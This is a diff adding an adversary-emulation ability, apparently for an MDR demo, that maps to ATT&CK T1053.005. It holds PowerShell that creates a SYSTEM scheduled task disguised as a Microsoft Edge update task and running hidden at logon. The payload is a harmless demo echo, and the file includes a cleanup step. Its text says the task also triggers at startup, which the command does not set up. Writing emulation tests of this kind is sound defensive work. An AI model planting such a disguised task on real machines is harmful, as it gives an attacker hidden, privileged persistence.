@@ -1,0 +1,32 @@
+---
+- id: scn003-a2-scheduled-task-persistence
+  name: "SCN-003 | Establish Persistence via Scheduled Task"
+  description: |
+    Creates a scheduled task that re-runs the implant on user logon and
+    at system startup, ensuring the attacker maintains access even after
+    a reboot or session timeout. Uses native schtasks.exe — no external tools.
+    This is one of the most common persistence mechanisms observed in MDR cases.
+    Maps to T1053.005 (Scheduled Task/Job: Scheduled Task).
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== SCHEDULED TASK PERSISTENCE (T1053.005) ===";
+          $taskName = "MicrosoftEdgeUpdateTaskMachineCore";
+          $taskAction = "powershell.exe -WindowStyle Hidden -NonInteractive -Command `"Write-Output 'MDR-DEMO-BEACON'`"";
+          schtasks /create /tn $taskName /tr $taskAction /sc onlogon /ru SYSTEM /f;
+          Write-Output "";
+          Write-Output "[*] Verifying task was created:";
+          schtasks /query /tn $taskName /fo LIST;
+          Write-Output "";
+          Write-Output "[*] Task disguised as: MicrosoftEdgeUpdateTaskMachineCore";
+          Write-Output "[*] Trigger: On user logon + At system startup";
+          Write-Output "[*] RunAs: SYSTEM";
+          Write-Output "=== PERSISTENCE ESTABLISHED ==="
+        cleanup: |
+          schtasks /delete /tn "MicrosoftEdgeUpdateTaskMachineCore" /f;
+          Write-Output "Scheduled task removed"
